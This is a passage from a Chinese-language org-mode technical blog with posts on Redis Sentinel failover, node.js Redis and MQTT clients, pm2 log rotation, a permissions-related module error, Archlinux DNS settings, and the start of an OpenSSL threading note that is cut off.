       [[file:../static/redis-sentinel-c.conf][redis-sentinel-c.conf]]

     终端 =3= 启动 =Sentinel a= =redis-sentinel ./redis-sentinel-a.conf=

     终端 =4= 启动 =Sentinel b= =redis-sentinel ./redis-sentinel-b.conf=

     终端 =5= 启动 =Sentinel c= =redis-sentinel ./redis-sentinel-c.conf=

     可以发现当 =Sentinel= 实例启动时 =Sentinel= 的配置文件会自动进行更新，记录 =Slave= 及其它 =Sentinel= 的信息。

   - 从 =Sentinel= 获取当前 =Master= 的地址

     通过 =redis-cli= 连上任一 =Sentinel= =redis-cli -p 5000=

     #+begin_example
       127.0.0.1:5000> sentinel get-master-addr-by-name mymaster
       1) "127.0.0.1"
       2) "6379"
     #+end_example

   - 故障切换测试

     让 =Master= 停止响应 =30= 秒 =redis-cli -p 6379 debug sleep 30=

     约 =10= 秒钟后，通过 =Sentinel= 的日志输出看到发生了主从切换。
     
     重新获取当前的 =Master=

     #+begin_example
       127.0.0.1:5000> sentinel get-master-addr-by-name mymaster
       1) "127.0.0.1"
       2) "6380"
     #+end_example
     
     =Redis= 实例的配置文件被自动修正，以反映新的 =Master-Slave= 状态：
     
         =redis-master.conf= 添加了配置行 =slaveof 127.0.0.1 6380=

         =redis-slave.conf= 删除了配置行 =slaveof 127.0.0.1 6379=

     和我们在上一篇文章《 [[http://blog.kankanan.com/article/redis-9ad853ef7528602757fa7840ff1a-master-slave.html][redis高可用性基础：Master-Slave]] 》手工做的主备切换如出一辙。
     
     三个 =Sentinel= 配置文件中的 =Master-Slave= 配置也被自动修正。

** 疑问

   - =Redis= 实例的配置文件是被谁修改的？

     如果是 =Sentinel= 那么就意味着所有 =Redis= 实例的同一机器上必须配置有 =Sentinel= （《[[http://redis.io/topics/sentinel][Redis Sentinel Documentation – Redis]]》未提及）。
     
   - 万一因为某种原因，原 =Master= 配置文件未改为 =Slave= ，会不会出现脑裂？

     感觉应该是会出现脑裂的，但是只要客户端应用总是使用 =Sentinel= 提供的 =Master= 地址，就不会有问题。

     =node.js= 访问单个 =redis= 实例已经用得很溜了，下一篇文章会研究 =node.js= 访问 =redis sentinel= ，相信答案就会水落石出了。
     
   - =Redis Sentinel= 能保证不丢数据吗？

     不能。由于 =Redis= 是异步复制，没有办法防止数据丢失，假设配置如下：

     #+begin_example
       min-slaves-to-write 1
       min-slaves-max-lag 10
     #+end_example
     
     假设出现了分裂（partition）， =Master= 要 =10= 秒钟后才发现 =Slave= 失联再禁止写入，当分裂消除（partition heals）， 旧 =Master= 做为 =Slave= 连上新的 =Master= ，这 =10= 秒钟内写入的数据不会合入（merge）新的 =Master= ，数据丢失了。

** 参考
   
   [[http://redis.io/topics/sentinel][Redis Sentinel Documentation – Redis]]

* DONE node.js连接redis高可用性方案：Sentinel                    :redis:node:
  CLOSED: [2015-12-27 Sun 14:27]

  node.js后台应用在开始时往往不会搞得太复杂，使用单实例的redis，一般都会使用官方推荐的模块 [[https://github.com/NodeRedis/node_redis][node_redis]] 。

** 访问单实例node.js

   在 [[https://github.com/NodeRedis/node_redis][node_redis]] 的基础上稍作封装，主要是避免并行访问时意外创建多个redis连接。

*** database.js

    #+begin_src js
      var redis = require('redis');

      function Database() {
          var self = this;

          self._redis_host = '127.0.0.1';
          self._redis_port = 6379;
          self._redis_db = 2;

          self._redis = null;
          self._redis_selected = false;
      }

      Database.prototype.redis = function(callback) {
          var self = this;

          if (self._redis && self._redis_selected) {
              return callback(null, self._redis);
          }

          if (! self._redis) {
              self._redis = redis.createClient(self._redis_port, self._redis_host);
          }

          self._redis.select(self._redis_db, function (err) {
              if (err) {
                  return callback(err);
              }

              self._redis_selected = true;

              return callback(null, self._redis);
          });
      };


      module.exports = new Database();
    #+end_src

*** client.js

    使用 =database.js=

    #+begin_src js
      var db = require('./database');

      db.redis(function (err, client) {
          if(err) {
              console.error(err.toString());
              return process.exit(1);
          }

          client.set('hello', 'world', function (err) {
              if(err) {
                  console.error(err.toString());
                  return process.exit(1);
              }

              setTimeout(function () {
                  client.get('hello', function (err, value) {
                      if(err) {
                          console.error(err.toString());
                          return process.exit(1);
                      }

                      console.log('hello: ' + value);

                      process.exit(0);
                  });
              }, 20*1000);
          });
      });
   #+end_src

** 访问主备Redis
    
   但是随着服务的成功，用户量开始增加，另外对稳定性、可靠性有了一定要求，确保数据的安全性成了重中之重，redis由单机转向主/备（Replication）甚至集群（Cluster），
   本文只关注使用 =Sentinel= 管理的主/备（Replication）Redis。

   这就意味着Redis客户端应用不能直接连接Redis实例，而是需要先连接 =Sentinel= ，根据 =Sentinel= 提供的 =Master= 或 =Slave= 地址连接Redis实例，
   还要接收 =Sentinel= 的 =Master= =Slave= 变动通知，重连Redis实例。

   不幸的是，[[https://github.com/NodeRedis/node_redis][node_redis]] 模块只支持单实例redis，基于 [[https://github.com/NodeRedis/node_redis][node_redis]] 实现与 =Sentinel= 的交互工作量比较大。

   所幸的是 [[http://github.com/luin/ioredis/][ioredis]] （现已成为redis官方推荐模块）出现了，它支持 =Sentinel= ，而且大部分API跟 [[https://github.com/NodeRedis/node_redis][node_redis]] 是兼容的:

   #+begin_quote
   ioredis is a robust, full-featured Redis client that is used in the world's biggest online commerce company Alibaba and many other awesome companies.

     1. Full-featured. It supports Cluster, Sentinel, Pipelining and of course Lua scripting & Pub/Sub (with the support of binary messages).
     2. High performance.
     3. Delightful API. It works with Node callbacks and Bluebird promises.
     4. Transformation of command arguments and replies.
     5. Transparent key prefixing.
     6. Abstraction for Lua scripting, allowing you to define custom commands.
     7. Support for binary data.
     8. Support for TLS.
     9. Support for offline queue and ready checking.
    10. Support for ES6 types, such as Map and Set.
    11. Support for GEO commands (Redis 3.2 Unstable).
    12. Sophisticated error handling strategy.
   #+end_quote

   [[http://github.com/luin/ioredis/][ioredis]] 提供了从 [[https://github.com/NodeRedis/node_redis][node_redis]] 进行迁移的文档 [[https://github.com/luin/ioredis/wiki/Migrating-from-node_redis][Migrating from node_redis]] 。

   但也要注意 [[http://github.com/luin/ioredis/][ioredis]] 的不同之处，如连接 =Redis= 失败时， [[https://github.com/NodeRedis/node_redis][node_redis]] 默认是不重连，而 [[http://github.com/luin/ioredis/][ioredis]] 会重连，在 =redis= 故障时可能导致 =node.js= 积压大量请求耗尽内存。

   参考文档 [[https://github.com/luin/ioredis/blob/master/README.md#sentinel][ioredis Sentinel]] ，将上一节 =访问单实例node.js= 中redis封装代码改成支持 =Sentinel=

*** database.js

    #+begin_src js
      var Redis = require('ioredis');

      function Database() {
          var self = this;

          self._redis_options = {
              name: 'mymaster',
              sentinels: [{
                  host: '127.0.0.1',
                  port: 5000
              }, {
                  host: '127.0.0.1',
                  port: 5001
              }],
              db: 2
          };

          self._redis = null;
      }

      Database.prototype.redis = function(callback) {
          var self = this;

           if (! self._redis) {
              self._redis = new Redis(self._redis_options);
          }

          return callback(null, self._redis);
      };

      module.exports = new Database();
    #+end_src

    和使用 [[https://github.com/NodeRedis/node_redis][node_redis]] 的 =database.js= 对照一下，可以发现 [[http://github.com/luin/ioredis/][ioredis]] 连接 =redis= 时，支持 =db= 选项，可以省去调用 =select= 。

    值得注意的是 [[https://github.com/NodeRedis/node_redis][node_redis]] 最近开始支持连接 =redis= 时指定 =db= 选项，见 [[https://github.com/NodeRedis/node_redis/commit/a4285c156c5b8964d92a36bd7f361a6f40e2449a][Parse redis url just like IANA · NodeRedis/node_redis@a4285c1]] ，
    使用该特性时请安装最新版的 [[https://github.com/NodeRedis/node_redis][node_redis]] 。

    #+begin_quote
    db: null; If set, client will run redis select command on connect. This is not recommended.
    #+end_quote
    引用自 [[https://github.com/NodeRedis/node_redis#rediscreateclient][redis.createClient()文档]]

*** 启动 Redis 及 Sentinel

    启动上一篇文章《 [[http://blog.kankanan.com/article/redis-9ad853ef7528602765b96848ff1a-sentinel.html][redis高可用性方案：Sentinel]] 》配置好的 =Sentinel=

    - =Master= =redis-server ./redis-master.conf= 
   
    - =Slave= =redis-server ./redis-slave.conf=

    - =Sentinel a= =redis-sentinel ./redis-sentinel-a.conf=
   
    - =Sentinel b= =redis-sentinel ./redis-sentinel-b.conf=

    - =Sentinel c= =redis-sentinel ./redis-sentinel-c.conf=

*** 演示运行

    运行演示脚本

    #+begin_src sh -n -r
      node client.js & (ref:master_write)
      sleep 1 (ref:wait_sync)
      redis-cli -p 6380 -n 2 get hello (ref:slave_read)
      redis-cli -p 6379 debug sleep 30 & (ref:failover)
    #+end_src
    
    - 行 [[(master_write)]] :: 运行 =client.js= 在 =Master= 写入键值

    - 行 [[(wait_sync)]] :: 等待 =Master= 同步数据到 =Slave=

    - 行 [[(slave_read)]] :: 从 =Slave= 读取键值

    - 行 [[(failover)]] :: 触发故障切换

    演示脚本运行结果
      
    #+begin_example +n -r
    "world" (ref:slave_read_result)
    OK (ref:slave_read_status)
    hello: world (ref:master_read)
    #+end_example

    - 行 [[(slave_read_result)]] :: 演示脚本行 [[(slave_read)]] 的redis命令执行结果

    - 行 [[(slave_read_status)]] :: 演示脚本行 [[(slave_read)]] 的redis命令执行状态
      
    - 行 [[(master_read)]] :: 演示脚本行 [[(master_write)]] 后台运行结束时输出的键值，此时由于主备已切换，是从新的 =Master= （原 =Slave= ）上获取的

** 参考

   [[https://github.com/luin/ioredis/blob/master/README.md#sentinel][ioredis Sentinel]]

* DONE 控制pm2的日志文件大小                                           :node:pm2:
  CLOSED: [2015-12-25 Fri 18:41]

  下班前发现线上服务器的 =100G= 磁盘只有 =10%= 空闲空间了，检查了一下是 =pm2= 的日志文件（在 =~/.pm2/logs= 目录下）占用的。

  参考帖子 [[https://github.com/Unitech/pm2/issues/535][Limit logs size? · Issue #535 · Unitech/pm2]] 安装 [[https://www.npmjs.com/package/pm2-logrotate][pm2-logrotate]] =pm2 install pm2-logrotate= ，

  安装完成后，观察到正在按时间切分成多个日志文件，但空闲空间在迅速减少，眼看就要低于 =5%= 了，要是磁盘满了会影响关键的 =redis= 数据库，

  立即手工将日志文件全部删除，但是磁盘空闲空间在继续减少，明白是 =pm2= 或者 =pm2-logrotate= 打开了日志文件导致空间无法释放，

  立即执行 =pm2 kill= ， 等 =crontab= 将服务重新拉起，一分钟后确认危机解决。好在这台服务器上的 =node.js= 服务都不是很关键，

  没有造成太大影响，圣诞节快乐:)

** 今天（2016-02-16）运维人员发现pm2的日志快占满磁盘

   [[https://www.npmjs.com/package/pm2-logrotate][pm2-logrotate]] （当前版本为1.3.1） 默认情况下，并未限制日志文件数，旧的日志文件未自动删除释放空间，需要设置 retain 配置项：

   #+begin_src js
     pm2 set pm2-logrotate:retain 100
   #+end_src

   这样最多会保留 100 个日志文件。

   max_size 配置项默认是 10MB，并不意味着切割出来的日志文件大小一定就是 10MB，而是检查时发现日志文件大小达到 max_size，则触发日志切割。

   interval 和 interval_unit 配置项指定了按时间维度进行日志切割。

   切割是指将日志文件内容移到名称为 <project name>-out__YYYY-MM-DD-HH-mm.log 的日志文件中，所以日志文件大小往往是超过 max_size 的。

   由于默认配置 interval 为 1， interval_unit 为 DD，所以每天至少会切割一次日志，每分钟当发现日志大小超过 10MB，也会触发一次日志切割。

   pm2-logrotate 现阶段小问题还是比较多的（详见项目的 [[https://github.com/pm2-hive/pm2-logrotate/issues][issues]] ），如：

   - 日志文件日期始终是前一天，日志文件大小超过 max_size 触发日志切割时，文件名中的日期也为前一天不合理了。
     
     详见 [[https://github.com/pm2-hive/pm2-logrotate/issues/18][Fast growing log files may be overwritten #18]]

   - 如果日志文件写得很快，切割时有可能因为日志文件名冲突，导致同名的旧日志文件被覆盖。

     详见 [[https://github.com/pm2-hive/pm2-logrotate/issues/17][Rotated files date #17]]
     
   - pm2 开启 merge_logs 时，日志会重复
     
     详见 [[https://github.com/pm2-hive/pm2-logrotate/issues/14][logrotate rotate the log multiple times if merge_logs is true #14]]
     
   - 无法精确限制日志占用空间。

     不过 logrotate 工具也不能，所以也不算是个严重的问题。
     
   更好的方式可能是使用操作系统的 logrotate 服务。

* DONE 修复文件目录权限引起的错误：Cannot find module                  :node:pm2:
  CLOSED: [2015-12-28 Mon 15:28]

  =node.js= 应用部署后多次遇到这种错误：

  #+begin_example
    Error: Cannot find module '../encodings'
          at Function.Module._resolveFilename (module.js:338:15)
          at Function.Module._load (module.js:289:25)
          at Function._load (/usr/local/www.xxxxxxxx.com/node_modules/pm2/node_modules/pmx/lib/transaction.js:62:21)
          at Module.require (module.js:366:17)
          at require (module.js:385:17)
          at Object.getCodec (/usr/local/www.xxxxxxxx.com/node_modules/koa-body/node_modules/co-body/node_modules/raw-body/node_modules/iconv-lite/lib/index.js:61:27)
          at Object.getDecoder (/usr/local/www.xxxxxxxx.com/node_modules/koa-body/node_modules/co-body/node_modules/raw-body/node_modules/iconv-lite/lib/index.js:118:23)
          at getDecoder (/usr/local/www.xxxxxxxx.com/node_modules/koa-body/node_modules/co-body/node_modules/raw-body/index.js:44:18)
          at readStream (/usr/local/www.xxxxxxxx.com/node_modules/koa-body/node_modules/co-body/node_modules/raw-body/index.js:218:15)
          at executor (/usr/local/www.xxxxxxxx.com/node_modules/koa-body/node_modules/co-body/node_modules/raw-body/index.js:110:5)
  #+end_example

  下意识地以为是 =node.js= 版本用错了（ =npm install= 和运行时的 =node.js= 版本不一致），删除 =node_modules= 重新 =npm install= 后还是一样的问题。

  查了一下源代码，找到了出错位置 =node_modules/koa-body/node_modules/co-body/node_modules/raw-body/node_modules/iconv-lite/lib/index.js:61= ：

  #+begin_src js
    if (!iconv.encodings)
        iconv.encodings = require("../encodings"); // Lazy load all encoding definitions.
  #+end_src

  这是延迟加载模块，代码本身没有错， =../encodings= 模块是存在的，以前也有遇到类似问题，不过是在 =node.js= 一启动就报错，因为系统默认的权限太严格了（如： =umask= 为 =0077= ）， =npm install= 安装的 =node_modules= 其它用户（如 =nobody= ）没有访问权限。这次是在处理用户请求过程中报错，考虑到上面的模块是延迟加载，在初始化完成与监听端口处理用户请求的代码之间，我的代码有 =setuid= 到 =nobody= 的逻辑，应该还是文件目录权限引起。

  最终发现是 =/usr/local/www.xxxxxxxx.com= 在创建时因为系统默认的权限设置太严格（ =umask= 为 =0077= ），导致 =nobody= 用户无法访问，改一下目录权限后问题修复。

* DONE Archlinux下解决上网慢问题                          :archlinux:network:
  CLOSED: [2015-12-30 Wed 10:17]

  发现  =Firefox= 的状态栏长时间显示 =Looking up www.xxxx.com ...= ，应该是我的电脑的 =DNS= 配置出问题了。

  =/etc/resolv.conf= 内容如下：

  #+begin_example
    # Generated by resolvconf
    search lan
    nameserver 8.8.8.8
    nameserver 192.168.111.1
  #+end_example

  =/etc/resolvconf.conf= 内容如下：

  #+begin_example
    resolv_conf=/etc/resolv.conf
    name_servers=8.8.8.8
  #+end_example

  我配置的是使用静态DNS =8.8.8.8= ，但是 =/etc/resolv.conf= 文件内容多出了两项，怀疑是 =search lan= 引起。

  很多的网络管理工具都会去改动 =/etc/resolv.conf= 文件，如 =pdnsd= =dnsmasq= =NetworkManager= 。

** 禁止 =NetworkManager= 改动 =/etc/resolv.conf=

   - 修改 =/etc/NetworkManager/NetworkManager.conf= 配置
     
     =dns=none=
  
   - 重新载入 =systemd= 配置
     
     =sudo systemctl daemon-reload=

   - 重启 =NetworkManager=
     
     =sudo systemctl restart NetworkManager=
    
   - 重新生成 =/etc/resolv.conf=
     
     =sudo resolvconf -u=

     #+begin_example
       # Generated by resolvconf
       nameserver 8.8.8.8
     #+end_example
     
     现在可以正常上网了。
     
     但是静态DNS =8.8.8.8= 不太稳定，最好换成优先使用DHCP分配的本地DNS。

** 使用DHCP分配的本地DNS

   - 撤销之前对 =/etc/NetworkManager/NetworkManager.conf= 的修改

     =dns=default=

   - 去掉 =/etc/resolvconf.conf= 配置的静态DNS

     #+begin_example
       resolv_conf=/etc/resolv.conf
       #name_servers=8.8.8.8
     #+end_example
   
   - 重新载入 =systemd= 配置
     
     =sudo systemctl daemon-reload=

   - 重启 =NetworkManager=
     
     =sudo systemctl restart NetworkManager=
    
   - 重新生成 =/etc/resolv.conf=
     
     =sudo resolvconf -u=

     #+begin_example
       # Generated by resolvconf
       nameserver 192.168.111.1
     #+end_example

     过一会儿 =/etc/resolv.conf= 内容自动被更新

     #+begin_example
       # Generated by resolvconf
       search lan
       nameserver 192.168.111.1
     #+end_example

     =search lan= 又出现了， =NetworkManager= 貌似是通过 =dhclient= 对 =/etc/resolv.conf= 进行修改的，
     具体指令参见 =/sbin/dhclient-script= 。

     上网又很流畅了，看来之前上网慢是由 =8.8.8.8= DNS服务器抽风引起，与 =search lan= 配置无关。

** 参考

   [[https://wiki.archlinux.org/index.php/Resolv.conf#Preserve_DNS_settings][resolv.conf - ArchWiki]]
* DONE mqtt协议一瞥                                             :network:IoT:
  CLOSED: [2016-01-05 Tue 11:16]

  #+begin_quote
  IoT是Internet of Things的缩写，字面翻译是“物体组成的因特网”，准确的翻译应该为“物联网”。物联网(Internet Of Things)又称传感网，简要讲就是互联网从人向物的延伸。
  #+end_quote
  引用自 [[http://baike.baidu.com/subview/2831030/13489169.htm][IOT（物联网）_百度百科]]


  #+begin_quote
  MQTT is a machine-to-machine (M2M)/"Internet of Things" connectivity protocol. It was designed as an extremely lightweight publish/subscribe messaging transport. It is useful for connections with remote locations where a small code footprint is required and/or network bandwidth is at a premium. For example, it has been used in sensors communicating to a broker via satellite link, over occasional dial-up connections with healthcare providers, and in a range of home automation and small device scenarios. It is also ideal for mobile applications because of its small size, low power usage, minimised data packets, and efficient distribution of information to one or many receivers.
  #+end_quote
  引用自 [[http://mqtt.org/][mqtt.org]]


  #+begin_quote
  MQTT（Message Queuing Telemetry Transport，消息队列遥测传输）是IBM开发的一个即时通讯协议，有可能成为物联网的重要组成部分。
  #+end_quote
  引用自 [[http://baike.baidu.com/view/9956531.htm][MQTT_百度百科]]


  #+begin_quote
  MQTT is a lightweight messaging protocol that is based on publish/subscribe pattern. Due to its low overhead and simplicity, this protocol is suitable for use in IoT and M2M applications. 
  #+end_quote
  引用自 [[http://www.bitreactive.com/mqtt-request-response/][Request/Response Pattern Over MQTT | Bitreactive]]


  #+begin_quote
  MQTT - MQ Telemetry Transport
 
    轻量级的 Machine-to-Machine 通信协议。
    Publish/Subscribe模式。
    基于TCP/IP。
    支持QoS。
    适合于低带宽、不可靠连接、嵌入式设备、CPU内存资源紧张。
    是一种比较不错的Android消息推送方案。
    FacebookMessenger采用了MQTT。
    MQTT有可能成为物联网的重要协议。
  #+end_quote
  引用自 [[http://www.cnblogs.com/caca/p/mqtt.html][MQTT协议简记 - cacard - 博客园]]

  #+begin_quote
  Why MQTT?

    It is a publish/subscribe protocol
    It has Multiple Quality of Service levels (QOS)
    It has at-least-once and exactly-once semantics
    It has a low overhead (2 bytes at minimum)
    It supports offline messaging
    It retains messages, like a key/value store
  #+end_quote
  引用自 [[http://thejackalofjavascript.com/getting-started-mqtt/][Getting started with MQTT | The Jackal of Javascript]]

  
  _简言之， =mqtt= 就是简单高效基于 =发布/订阅= 的 =消息传输协议= ，主要用于资源受限设备（如：传感器、手机等）与服务器间有保障地进行消息或事件推送。_

  
** 有一些人（或项目）在尝试将 =mqtt= 扩展到其它用途

   - 请求/响应模型（Request/Response） :: [[http://www.bitreactive.com/mqtt-request-response/][Request/Response Pattern Over MQTT | Bitreactive]]

                     
   - 远程过程调用（RPC） :: [[https://github.com/wolfeidau/mqtt-rpc][wolfeidau/mqtt-rpc]]
    
    
   - 包裹WEB服务（REST） :: [[http://bytecontinnum.com/2014/12/consuming-mobile-apis-with-mqtt-reqres-pattern/][REST over MQTT for Constrained Devices/Mobiles | Prithiviraj Damodaran]]


** IoT领域的其它竞争对手
  
  - [[https://tools.ietf.org/html/rfc7252][CoAP]] :: Constrained Applications Protocol
    
            基于 =UDP= 协议，简化版的 [[https://tools.ietf.org/html/draft-ietf-httpbis-http2][HTTP/2]] 。

            #+begin_quote
            The Constrained Application Protocol (CoAP) is a specialized web transfer protocol for use with constrained nodes and constrained networks in the Internet of Things.
            The protocol is designed for machine-to-machine (M2M) applications such as smart energy and building automation.
            #+end_quote
            引用自  [[http://coap.technology/][CoAP — Constrained Application Protocol]]


  - [[https://tools.ietf.org/html/draft-ietf-httpbis-http2][HTTP/2]] :: HTTP/2 (originally named HTTP/2.0) is the second major version of the HTTP network protocol used by the World Wide Web
    
    [[http://timkellogg.me/blog/2015/02/20/can-http2-replace-mqtt/][Can HTTP/2 Replace MQTT? - Tim Kellogg]]

    [[http://www.limmat.co/2015/02/18/http-2-the-new-iot-protocol/][HTTP/2 - The New IoT Protocol?]]

    [[http://robbysimpson.com/2015/01/26/http2-and-the-internet-of-things/][HTTP/2 and the Internet of Things]]

    [[https://systembash.com/mqtt-vs-websockets-vs-http2-the-best-iot-messaging-protocol/][MQTT vs Websockets vs HTTP/2: The Best IoT Messaging Protocol?]]

    [[http://webofthings.org/2015/10/25/http2-for-internet-of-things-1/][What’s in HTTP/2 for the Internet of Things? 1/2 | Web of Things]]

** 个人总结

   [[https://tools.ietf.org/html/draft-ietf-httpbis-http2][HTTP/2]] 做为一种通用的应用层协议，由于被广泛部署，有着天然的优势，但是 =mqtt= 带来的 =Machine-To-Machine= 、 =offline= 、 =bridge=  消息传输，现在就可以应用到产品中。

   或许将来有一天会出现构建于 [[https://tools.ietf.org/html/draft-ietf-httpbis-http2][HTTP/2]] 上的类 =mqtt= 解决方案，它能够运行在绝大多数的资源内限嵌入式设备上，在这之前 =mqtt= 之类的成熟的应用层协议会有一席之地，特别是在它完美契合你的应用的情况下。

   做为一个开发者，与其坐等完美的解决方案出现，还不如立即开始学习 =mqtt= ，应用 =mqtt= ，从 =mqtt= 中学到协议设计的经验与技术，以至成为实现构建于 [[https://tools.ietf.org/html/draft-ietf-httpbis-http2][HTTP/2]] 上的类 =mqtt= 解决方案的那个人。

* DONE node.js下进行mqtt实践                               :network:IoT:node:
  CLOSED: [2016-02-21 Sun 13:13]

  通过 mqtt 可以将设备连接在一起，能够实现将消息（可能来自服务器也可能来自其它设备）推送到设备，如果设备离线，
  服务器可以暂存消息，在设备上线时再推送，有一些特性很关键：

  - offline

    允许设备暂时离线。

    即使是使用固定宽带，有些用户也会因为各种原因无法保持稳定的长连接，可能是上级路由设备有限制，或者是带宽被其它应用抢占而导致长连接不稳定。
    将设备的在线状态与 TCP 长连接状态耦合在一起是不明智的。

  - bridge

    设备连接在不同的 broker 上，通过 bridge 实现互通。

    支持几万台设备在线，估计一台 broker 就够了，但是一旦达到数十万、百万甚至上亿，肯定需要搭建 broker 集群，参见 [[http://www.kegel.com/c10k.html][The C10K problem]]。

  简单起见， node.js 服务器端使用 [[https://github.com/mcollina/mosca][mosca]]， 客户端使用 [[https://github.com/mqttjs/MQTT.js][MQTT.js]] ，由于 [[https://github.com/mcollina/mosca][mosca]] 不支持 bridge，本文不涉及 bridge 特性。

** 客户端与服务器通信

   - 客户端通过服务器给自已发个消息

     =server.js=
     #+begin_src js
       var mosca = require('mosca');

       var settings = {
           port: 1883
       };

       var server = new mosca.Server(settings);
       server.on('ready', function () {
           console.log('mosca server running');
       }).on('clientConnected', function (client) {
           console.log('client(' + client.id + ') connected');
       }).on('published', function (packet, client) {
           console.log('client(' + (client ? client.id : 'internal') + ') published topic(' + packet.topic + '): ' + packet.payload);
       }).on('subscribed', function (topic, client) {
           console.log('client(' + client.id + ') subscribed topic(' + topic + ')');
       }).on('unsubscribed', function (topic, client) {
           console.log('client(' + client.id + ') unsubscribed topic(' + topic + ')');
       }).on('clientDisconnecting', function (client) {
           console.log('client(' + client.id + ') disconnecting');
       }).on('clientDisconnected', function (client) {
           console.log('client(' + client.id + ') disconnected');
       });
     #+end_src

     =client.js=
     #+begin_src js
       var mqtt = require('mqtt');


       var client = mqtt.connect('mqtt://127.0.0.1:1883');
       client.on('connect', function () {
           client.subscribe('presence');
           client.publish('presence', 'a message from myself');
       }).on('message', function (topic, message) {
           console.log(topic + ': ' + message.toString());
           client.end();
       });
     #+end_src
     
     运行 =server.js=
     #+begin_example
       $ node server.js
       mosca server running
       client(mqttjs_a423c0af) connected
       client(internal) published topic($SYS/41TXEHPDe/new/clients): mqttjs_a423c0af
       client(mqttjs_a423c0af) subscribed topic(presence)
       client(internal) published topic($SYS/41TXEHPDe/new/subscribes): {"clientId":"mqttjs_a423c0af","topic":"presence"}
       client(mqttjs_a423c0af) published topic(presence): a message from myself
       client(mqttjs_a423c0af) unsubscribed topic(presence)
       client(mqttjs_a423c0af) disconnected
       client(internal) published topic($SYS/41TXEHPDe/new/unsubscribes): {"clientId":"mqttjs_a423c0af","topic":"presence"}
       client(internal) published topic($SYS/41TXEHPDe/disconnect/clients): mqttjs_a423c0af
     #+end_example

     运行 =client.js=
     #+begin_example
       $ node client.js
       presence: a message from myself
       $ 
     #+end_example

** 客户端与客户端通信

   - 客户端发送消息给另一个客户端

     下面的例子演示了客户端通过约定的 =topic= 互相通信。

     =client_sub.js=
     #+begin_src js
       var mqtt = require('mqtt');

       var client = mqtt.connect('mqtt://127.0.0.1:1883');
       client.on('connect', function () {
           client.publish('sub', 'message from pub');
       }).on('message', function (topic, message) {
           console.log(topic + ': ' + message.toString());
           client.end();
       });
     #+end_src

     =client_pub.js=
     #+begin_src js
       var mqtt = require('mqtt');

       var client = mqtt.connect('mqtt://127.0.0.1:1883');
       client.on('connect', function () {
           client.publish('sub', 'message from pub');
       }).on('message', function (topic, message) {
           console.log(topic + ': ' + message.toString());
           client.end();
       });
     #+end_src
     
     运行 =server.js=
     #+begin_example
       $ node server.js
       mosca server running
       client(mqttjs_ebdc9fd4) connected
       client(internal) published topic($SYS/4Jk9PBwDe/new/clients): mqttjs_ebdc9fd4
       client(mqttjs_ebdc9fd4) subscribed topic(sub)
       client(internal) published topic($SYS/4Jk9PBwDe/new/subscribes): {"clientId":"mqttjs_ebdc9fd4","topic":"sub"}
       client(mqttjs_ff000868) connected
       client(internal) published topic($SYS/4Jk9PBwDe/new/clients): mqttjs_ff000868
       client(mqttjs_ff000868) published topic(sub): message from pub
       client(mqttjs_ebdc9fd4) unsubscribed topic(sub)
       client(mqttjs_ebdc9fd4) disconnected
       client(internal) published topic($SYS/4Jk9PBwDe/new/unsubscribes): {"clientId":"mqttjs_ebdc9fd4","topic":"sub"}
       client(internal) published topic($SYS/4Jk9PBwDe/disconnect/clients): mqttjs_ebdc9fd4
     #+end_example

     运行 =client_sub.js=
     #+begin_example
       $ node client_sub.js
       sub: message from pub
       $ 
     #+end_example

     运行 =client_pub.js=
     #+begin_example
       $ node client_pub.js
     #+end_example

** 客户端与客户端离线通信
   
   离线通信需要同时满足以下条件

   - 服务器配置持久存储

   - 订阅方启用会话状态
     
     连接服务器时使用同样的 clientId 并指定 =clean= 为 =false=
   
   - 发布方发布持久消息
     
     发布消息时指定 =qos= 大于 =0= 以及 =retain= 为 =true=

   下面的例子演示了客户端接收离线消息
   
   =client_sub.js=
   #+begin_src js
     var mqtt = require('mqtt');

     var client = mqtt.connect('mqtt://127.0.0.1:1883', {clientId: 'sub', clean: false});
     client.on('connect', function () {
         client.subscribe('sub');
     }).on('message', function (topic, message) {
         console.log(topic + ': ' + message.toString());
         client.end();
     });
   #+end_src

   =client_pub.js=
   #+begin_src js
     var mqtt = require('mqtt');

     var client = mqtt.connect('mqtt://127.0.0.1:1883', {clientId: 'pub'});
     client.on('connect', function () {
         client.publish('sub', 'message from pub', {qos: 1, retain: true});
     }).on('message', function (topic, message) {
         console.log(topic + ': ' + message.toString());
         client.end();
     });
   #+end_src

   运行 =srever.js=
   #+begin_example
     $ node mqtt_server.js
     mosca server running
     client(sub) connected
     client(internal) published topic($SYS/V19OSVfix/new/clients): sub
     client(sub) subscribed topic(sub)
     client(internal) published topic($SYS/V19OSVfix/new/subscribes): {"clientId":"sub","topic":"sub"}
     client(sub) disconnected
     client(internal) published topic($SYS/V19OSVfix/disconnect/clients): sub
     client(pub) connected
     client(internal) published topic($SYS/V19OSVfix/new/clients): pub
     client(pub) published topic(sub): message from pub
     client(sub) connected
     client(internal) published topic($SYS/V19OSVfix/new/clients): sub
     client(sub) subscribed topic(sub)
     client(internal) published topic($SYS/V19OSVfix/new/subscribes): {"clientId":"sub","topic":"sub"}
     client(sub) disconnected
     client(internal) published topic($SYS/V19OSVfix/disconnect/clients): sub
   #+end_example

   运行 =client_sub.js= 订阅消息后退出
   #+begin_example
     $ node client_sub.js 
     sub: message from pub
     $ 
   #+end_example

   运行 =client_pub.js= 发布消息
   #+begin_example
     $ node mqtt_client_pub.js 
   #+end_example

   运行 =client_sub.js= 接收离线消息后退出
   #+begin_example
     $ node client_sub.js 
     sub: message from pub
     $ 
   #+end_example

** 参考

   [[http://docs.oasis-open.org/mqtt/mqtt/v3.1.1/os/mqtt-v3.1.1-os.html][MQTT Version 3.1.1]]

   [[https://www.youtube.com/watch?v=WE7GVIFRV7Q][Matteo Collina: "MQTT" and "Node.js"- Messaging the Internet of Things ]]

   [[http://thejackalofjavascript.com/getting-started-mqtt/][Getting started with MQTT | The Jackal of Javascript]]

* TODO 多线程下建立ssl连接的正确姿势                              :c:openssl:

  先看一个应用程序崩溃堆栈

  #+begin_example
    (gdb) bt
    #0  0x00000000 in ?? ()
    #1  0xb6d735cc in CRYPTO_add_lock () from /usr/lib/libcrypto.so.1.0.0
    #2  0x00000000 in ?? ()
  #+end_example

  这个崩溃在一台机器上是必现，在其它机器上还没有遇见过。

  网络上搜索了一下，发现 =openssl= 在多线程环境下，有需要注意的地方，可以看一下这篇帖子《[[http://stackoverflow.com/questions/3919420/tutorial-on-using-openssl-with-pthreads][reference - Tutorial on Using OpenSSL with pthreads - Stack Overflow]]》。

  #+begin_quote
  OpenSSL can safely be used in multi-threaded applications provided that at least two callback functions are set, locking_function and threadid_func.

